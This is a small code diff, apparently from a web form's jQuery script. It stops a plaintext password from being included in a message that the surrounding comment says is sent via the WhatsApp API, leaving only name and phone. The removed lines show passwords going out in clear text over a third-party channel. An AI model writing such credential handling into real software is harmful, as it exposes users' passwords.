@@ -532,10 +532,7 @@ $(function () {
                 fullName +
                 '\n' +
                 'Phone: ' +
-                phone +
-                '\n' +
-                'Password: ' +
-                password
+                phone 
             )
           ) {
             // Send credentials via WhatsApp API
